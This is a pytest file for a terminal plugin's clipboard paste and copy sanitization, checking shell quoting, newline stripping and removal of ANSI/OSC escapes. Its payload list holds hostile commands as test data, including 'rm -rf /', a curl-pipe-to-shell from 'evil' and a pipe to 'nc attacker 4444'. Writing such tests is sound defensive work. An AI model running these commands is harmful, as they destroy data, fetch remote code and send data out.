"""Input-sanitization tests for the smart_clipboard plugin.

smart_clipboard exposes context-menu paste/copy helpers. Pasting clipboard
content into a terminal is a classic injection sink: a malicious clipboard
payload (copied from a web page, say) must not be able to run a command the
user didn't intend. These tests feed hostile clipboard / selection content
through the plugin callbacks and assert it is neutralized *before* it reaches
``terminal.send_text`` (or the system clipboard).

We never touch a real PTY: a fake terminal records what would be sent, and the
Qt clipboard is the real offscreen one (set + read in-process).
"""

import pytest
from qterminator.plugins.smart_clipboard import SmartClipboardPlugin


class _FakeTerminal:
    """Records send_text calls and serves a canned selection."""

    def __init__(self, selection=""):
        self.sent = []
        self._selection = selection

    def send_text(self, text, force=False):
        self.sent.append(text)

    def selected_text(self):
        return self._selection


@pytest.fixture
def plugin():
    return SmartClipboardPlugin()


@pytest.fixture
def clipboard(qapp):
    """The real (offscreen) Qt clipboard, cleared between tests."""
    from PyQt6.QtWidgets import QApplication

    cb = QApplication.clipboard()
    cb.clear()
    yield cb
    cb.clear()


# ---------------------------------------------------------------------------
# _make_paste_escaped: shell metacharacters must be quoted, not interpreted
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "foo; rm -rf /",
    "$(reboot)",
    "`reboot`",
    "a && curl evil | sh",
    "x | nc attacker 4444",
    "$HOME/secret",
    "name with spaces",
])
def test_paste_escaped_quotes_metacharacters(plugin, clipboard, payload):
    """Every dangerous payload must come out shlex-quoted so the shell sees
    a single literal argument, never a command separator / substitution."""
    import shlex

    clipboard.setText(payload)
    term = _FakeTerminal()
    plugin._make_paste_escaped(term)()

    assert len(term.sent) == 1
    sent = term.sent[0]
    assert sent == shlex.quote(payload)
    # The dangerous tokens must not appear *unquoted*: shlex.quote either
    # single-quotes the whole string or escapes the metachar.
    for token in (";", "&&", "|", "$(", "`"):
        if token in payload:
            # token may appear inside the single-quoted body, but the string
            # must start with a quote so the shell treats it literally.
            assert sent.startswith("'") or "\\" in sent


def test_paste_escaped_empty_clipboard_sends_nothing(plugin, clipboard):
    clipboard.clear()
    term = _FakeTerminal()
    plugin._make_paste_escaped(term)()
    assert term.sent == []


# ---------------------------------------------------------------------------
# _make_paste_single_line: newlines collapsed so a multi-line payload can't
# auto-execute by carrying its own carriage returns
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload,expected", [
    ("echo a\necho b", "echo a echo b"),
    ("echo a\r\necho b", "echo a echo b"),
    ("echo a\recho b", "echo a echo b"),
    ("one\ntwo\nthree", "one two three"),
])
def test_paste_single_line_strips_newlines(plugin, clipboard, payload, expected):
    clipboard.setText(payload)
    term = _FakeTerminal()
    plugin._make_paste_single_line(term)()
    assert term.sent == [expected]
    # No raw newline survives -- otherwise the shell would execute each line.
    assert "\n" not in term.sent[0]
    assert "\r" not in term.sent[0]


# ---------------------------------------------------------------------------
# _make_copy_no_colors: ANSI escape sequences stripped from copied text
# ---------------------------------------------------------------------------

def test_copy_no_colors_strips_ansi(plugin, clipboard):
    coloured = "\x1b[1;31mERROR\x1b[0m: \x1b[32mok\x1b[0m"
    term = _FakeTerminal(selection=coloured)
    plugin._make_copy_no_colors(term)()
    result = clipboard.text()
    assert result == "ERROR: ok"
    assert "\x1b" not in result


def test_copy_no_colors_strips_osc_sequences(plugin, clipboard):
    # OSC title-set sequence embedded in the selection must be removed too.
    payload = "before\x1b]0;malicious title\x07after"
    term = _FakeTerminal(selection=payload)
    plugin._make_copy_no_colors(term)()
    result = clipboard.text()
    assert "\x1b]" not in result
    assert "before" in result and "after" in result


def test_copy_no_colors_empty_selection_noop(plugin, clipboard):
    clipboard.setText("sentinel")
    term = _FakeTerminal(selection="")
    plugin._make_copy_no_colors(term)()
    # Nothing copied -> previous clipboard content untouched.
    assert clipboard.text() == "sentinel"
